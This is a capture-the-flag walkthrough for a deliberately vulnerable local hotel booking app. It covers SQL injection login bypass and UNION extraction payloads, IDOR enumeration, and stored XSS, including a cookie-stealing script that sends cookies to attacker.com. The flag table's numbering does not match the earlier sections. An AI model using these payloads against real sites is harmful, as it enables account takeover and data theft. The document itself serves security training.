# Grandview Hotel CTF Walkthrough

## Overview

**Challenge Name:** Grandview Hotel Security Assessment  
**Difficulty:** Intermediate  
**Target:** Hotel booking web application with multiple security vulnerabilities  
**Objective:** Discover and exploit 4 major security vulnerabilities to capture hidden flags

### Challenge Description

You've been hired as a penetration tester to assess the security of Grandview Hotel's new online booking system. The hotel management is concerned about potential security issues before going live. Your task is to identify vulnerabilities, exploit them, and document your findings.

**Mission Objectives:**
1. Perform reconnaissance and identify the application structure
2. Discover and exploit SQL Injection vulnerabilities
3. Bypass authentication mechanisms
4. Exploit Cross-Site Scripting (XSS) vulnerabilities
5. Access unauthorized data through Insecure Direct Object References (IDOR)

## Vulnerabilities Mapped to OWASP Top 10 (2021)

### 1. SQL Injection (A03:2021 - Injection)
### 2. Broken Authentication (A07:2021 - Identification and Authentication Failures)  
### 3. Cross-Site Scripting (A03:2021 - Injection)
### 4. Insecure Direct Object References (A01:2021 - Broken Access Control)

---

## Setup Instructions

### Prerequisites
- XAMPP installed and running
- MySQL database access
- Web browser with developer tools

### Installation Steps

1. **Clone/Download the application**
   ```bash
   # Place files in XAMPP htdocs directory
   cd C:\xampp\htdocs\
   # Extract/place grandview-hotel folder here
   ```

2. **Database Setup**
   - Start XAMPP (Apache + MySQL)
   - Open phpMyAdmin (http://localhost/phpmyadmin)
   - Import the database.sql file or run the SQL commands directly
   - Verify the database 'grandview_hotel' is created with sample data

3. **Application Access**
   - Navigate to: http://localhost/grandview-hotel/
   - Verify the application loads correctly
   - Test login with provided credentials

---

## Vulnerability #1: SQL Injection (A03:2021)

### Location
- **Primary Target:** Login page (`login.php`)
- **Secondary Target:** Search functionality (`search.php`)

### Vulnerability Description
The application uses direct string concatenation in SQL queries without proper parameterization, making it vulnerable to SQL injection attacks.

### Technical Details
```php
// Vulnerable code in login.php (line 15-17)
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND is_active = 1";
```

### Exploitation Steps

#### Method 1: Authentication Bypass

1. **Navigate to Login Page**
   ```
   http://localhost/grandview-hotel/login.php
   ```

2. **Test Basic SQL Injection**
   - Username: `admin'--`
   - Password: `anything`
   - Click Login

3. **Explanation**
   - The `'--` payload closes the username string and comments out the password check
   - Successfully logs in as admin without knowing the password

#### Method 2: Data Extraction via UNION

1. **Navigate to Search Page**
   ```
   http://localhost/grandview-hotel/search.php
   ```

2. **Test UNION-based Injection**
   ```sql
   ' UNION SELECT username,password,email,phone,role,id,is_active,'user' FROM users--
   ```

3. **Steps:**
   - Enter the payload in the search box
   - Observe that user credentials are displayed in search results
   - Extract usernames and passwords from the output

#### Method 3: Advanced Information Extraction

1. **Database Structure Discovery**
   ```sql
   ' UNION SELECT table_name,column_name,'','','','','','' FROM information_schema.columns--
   ```

2. **Extract Sensitive Data**
   ```sql
   ' UNION SELECT note_content,admin_id,'','','','','','' FROM admin_notes--
   ```

### Flags to Capture

1. **Flag 1:** `flag{sqli_union_success}` - Found in page source after successful UNION injection
2. **Flag 2:** `flag{admin_notes_exposed}` - Found in admin_notes table via SQL injection
3. **Flag 3:** `flag{user_enum_success}` - Found in users table (flag_user password field)

### Impact Assessment
- **Severity:** CRITICAL
- **CVSS Score:** 9.8
- **Impact:** Complete compromise of application data, authentication bypass, data theft

### Mitigation Recommendations
1. Use prepared statements with parameterized queries
2. Implement input validation and sanitization
3. Use least privilege database accounts
4. Enable SQL query logging and monitoring
5. Implement Web Application Firewall (WAF)

---

## Vulnerability #2: Broken Authentication (A07:2021)

### Location
- **Primary Target:** Login system (`login.php`, `register.php`)
- **Secondary Target:** Session management across application

### Vulnerability Description
Multiple authentication weaknesses including weak password storage, inadequate session management, and missing security controls.

### Technical Details
```php
// Vulnerable code in register.php - Plain text password storage
$insert_query = "INSERT INTO users (username, password, email, full_name, phone, role) 
                 VALUES (?, ?, ?, ?, ?, 'customer')";
$insert_stmt->execute([$username, $password, $email, $full_name, $phone]);
```

### Exploitation Steps

#### Method 1: Weak Password Storage

1. **Register a New Account**
   - Navigate to registration page
   - Create account with known credentials
   - Use SQL injection to view users table
   - Observe passwords stored in plain text

#### Method 2: Session Management Issues

1. **Login Normally**
   - Login with valid credentials
   - Note session ID in browser cookies
   - Session ID is not regenerated on login
   - No proper session timeout

#### Method 3: Information Disclosure

1. **Error Message Information Leakage**
   - Attempt login with SQL injection payload that causes error
   - Observe detailed database error messages
   - Extract database structure information

### Flags to Capture

1. **Flag 4:** `flag{config_exposure_found}` - Found in config.php source code comments
2. **Flag 5:** `flag{weak_auth_bypass}` - Obtained through authentication bypass

### Impact Assessment
- **Severity:** HIGH
- **CVSS Score:** 8.1
- **Impact:** Account takeover, session hijacking, credential theft

### Mitigation Recommendations
1. Implement proper password hashing (bcrypt, Argon2)
2. Regenerate session IDs on login
3. Implement session timeout and proper logout
4. Use secure session configuration
5. Implement account lockout mechanisms
6. Hide detailed error messages in production

---

## Vulnerability #3: Cross-Site Scripting (A03:2021)

### Location
- **Primary Target:** Feedback system (`dashboard.php`, `feedback.php`)
- **Secondary Target:** Review display on homepage

### Vulnerability Description
User input is not properly sanitized before output, allowing execution of malicious JavaScript code.

### Technical Details
```php
// Vulnerable code in feedback.php (line 45)
<p class="feedback-text"><?php echo $feedback['comment']; ?></p>
```

### Exploitation Steps

#### Method 1: Stored XSS via Feedback

1. **Complete a Booking**
   - Login as a customer
   - Make a room booking
   - Wait for booking status to be 'completed' (or modify database)

2. **Submit Malicious Feedback**
   - Go to Dashboard
   - Find completed booking
   - Submit feedback with XSS payload:
   ```html
   <script>alert('XSS Vulnerability Found!')</script>
   ```

3. **Trigger XSS**
   - Navigate to feedback page
   - Observe JavaScript execution
   - XSS payload is stored and executed for all visitors

#### Method 2: Advanced XSS Payloads

1. **Cookie Stealing Payload**
   ```html
   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
   ```

2. **DOM Manipulation**
   ```html
   <img src=x onerror=alert('XSS')>
   ```

3. **Iframe Injection**
   ```html
   <iframe src="javascript:alert('XSS')"></iframe>
   ```

### Flags to Capture

1. **Flag 6:** `flag{xss_feedback_stored}` - Found in database feedback table
2. **Flag 7:** `flag{stored_xss_success}` - Displayed after successful XSS execution

### Impact Assessment
- **Severity:** MEDIUM-HIGH
- **CVSS Score:** 6.1
- **Impact:** Account takeover, data theft, defacement, malware distribution

### Mitigation Recommendations
1. Implement proper output encoding (htmlspecialchars)
2. Use Content Security Policy (CSP)
3. Input validation and sanitization
4. Use secure JavaScript frameworks
5. Regular security code reviews

---

## Vulnerability #4: Insecure Direct Object References (A01:2021)

### Location
- **Primary Target:** User dashboard (`dashboard.php`)
- **Secondary Target:** Admin panel access

### Vulnerability Description
Application uses predictable resource identifiers without proper authorization checks, allowing users to access other users' data.

### Technical Details
```php
// Vulnerable code in dashboard.php (line 18)
$target_user_id = $_GET['user_id'] ?? $user_id;
// No authorization check to verify if user can access this user_id
```

### Exploitation Steps

#### Method 1: Access Other User Profiles

1. **Login as Regular User**
   - Login with credentials: john_doe/password123

2. **Identify IDOR Vulnerability**
   - Notice URL structure in dashboard
   - Current URL: `dashboard.php` (shows your profile)
   - Test: `dashboard.php?user_id=1`

3. **Enumerate User IDs**
   - Try different user IDs: 1, 2, 3, 4, 5
   - Observe different user profiles and data
   - Access admin profile with user_id=1

#### Method 2: Access Sensitive Bookings

1. **View Other Users' Bookings**
   - Use IDOR to access other user profiles
   - View their booking history
   - Access booking details including special requests

2. **Admin Data Access**
   - Access user_id=1 (admin account)
   - View administrative information
   - Access to all system bookings

### Flags to Capture

1. **Flag 8:** `flag{idor_booking_access}` - Found in special_requests field of booking ID 4
2. **Flag 9:** `flag{admin_access_unauthorized}` - Obtained by accessing admin profile via IDOR

### Impact Assessment
- **Severity:** HIGH
- **CVSS Score:** 8.5
- **Impact:** Unauthorized data access, privacy violations, information disclosure

### Mitigation Recommendations
1. Implement proper authorization checks
2. Use indirect references (UUIDs instead of sequential IDs)
3. Session-based access control validation
4. Role-based access control (RBAC)
5. Regular access control audits

---

## Additional Findings

### Information Disclosure Issues

1. **Source Code Comments**
   - Flag in HTML comments: `flag{source_code_analysis}`
   - Hidden in various page sources

2. **Configuration Exposure**
   - Database credentials in config.php
   - Debug information in error messages

3. **Test Credentials Exposure**
   - Hardcoded test credentials displayed on login page
   - Should be removed in production

### Security Headers Missing

1. **Missing Security Headers**
   ```
   X-Frame-Options: DENY
   X-XSS-Protection: 1; mode=block
   Content-Security-Policy: default-src 'self'
   Strict-Transport-Security: max-age=31536000
   ```

---

## Complete Flag List

| Flag ID | Flag Value | Location | Vulnerability Type |
|---------|------------|----------|-------------------|
| 1 | `flag{sqli_union_success}` | search.php footer | SQL Injection |
| 2 | `flag{admin_notes_exposed}` | admin_notes table | SQL Injection |
| 3 | `flag{user_enum_success}` | users table password | SQL Injection |
| 4 | `flag{config_exposure_found}` | config.php comments | Information Disclosure |
| 5 | `flag{source_code_analysis}` | index.php HTML comments | Information Disclosure |
| 6 | `flag{xss_feedback_stored}` | feedback table | XSS |
| 7 | `flag{idor_booking_access}` | booking special_requests | IDOR |

---

## Assessment Methodology

### Reconnaissance Phase
1. **Application Mapping**
   - Identify all accessible pages and functionality
   - Analyze application structure and data flow
   - Review client-side code and comments

2. **Technology Stack Identification**
   - PHP backend with MySQL database
   - Session-based authentication
   - No apparent security frameworks

### Vulnerability Assessment Phase
1. **Input Validation Testing**
   - Test all input fields for injection attacks
   - Analyze parameter handling and validation

2. **Authentication Testing**
   - Test login mechanisms and session management
   - Analyze password policies and storage

3. **Authorization Testing**
   - Test access controls and privilege escalation
   - Analyze direct object reference handling

### Exploitation Phase
1. **Proof of Concept Development**
   - Create working exploits for each vulnerability
   - Document attack vectors and payloads

2. **Impact Assessment**
   - Determine scope and severity of each vulnerability
   - Assess potential business impact

---

## Tools Used

### Primary Tools
- **Web Browser:** Manual testing and inspection
- **Developer Tools:** Network analysis and DOM inspection
- **Burp Suite Community:** Request interception and modification
- **SQLmap:** Automated SQL injection testing

### Secondary Tools
- **OWASP ZAP:** Automated vulnerability scanning
- **Nikto:** Web server vulnerability scanner
- **curl:** Command-line HTTP client for testing

---

## Remediation Priority

### Critical (Fix Immediately)
1. **SQL Injection vulnerabilities** - Complete database compromise risk
2. **Authentication bypass** - Administrative access compromise

### High (Fix Within 24 Hours)
1. **IDOR vulnerabilities** - Privacy and data protection violations
2. **Stored XSS** - Potential for widespread user compromise

### Medium (Fix Within 1 Week)
1. **Information disclosure** - Reduces attack surface
2. **Missing security headers** - Defense in depth

---

## Learning Outcomes

### Technical Skills Developed
1. **SQL Injection Techniques:** UNION-based attacks, authentication bypass
2. **XSS Exploitation:** Stored XSS payload development and testing
3. **Access Control Testing:** IDOR identification and exploitation
4. **Web Application Security:** Comprehensive vulnerability assessment

### Security Concepts Reinforced
1. **Defense in Depth:** Multiple security layers importance
2. **Input Validation:** Critical for preventing injection attacks
3. **Access Control:** Proper authorization implementation
4. **Secure Coding:** Security-first development practices

### Professional Development
1. **Penetration Testing Methodology:** Systematic approach to security testing
2. **Vulnerability Documentation:** Professional reporting standards
3. **Risk Assessment:** Business impact evaluation skills
4. **Client Communication:** Technical findings translation for stakeholders

---

## Conclusion

The Grandview Hotel booking application contains multiple critical security vulnerabilities that could lead to complete system compromise. The combination of SQL injection, broken authentication, XSS, and IDOR vulnerabilities creates a high-risk environment requiring immediate remediation.

This assessment demonstrates the importance of secure coding practices, proper input validation, and comprehensive security testing throughout the development lifecycle. Organizations must prioritize security from the initial design phase through deployment and maintenance.

**Final Recommendation:** The application should not be deployed to production without addressing all identified vulnerabilities and implementing a comprehensive security framework.









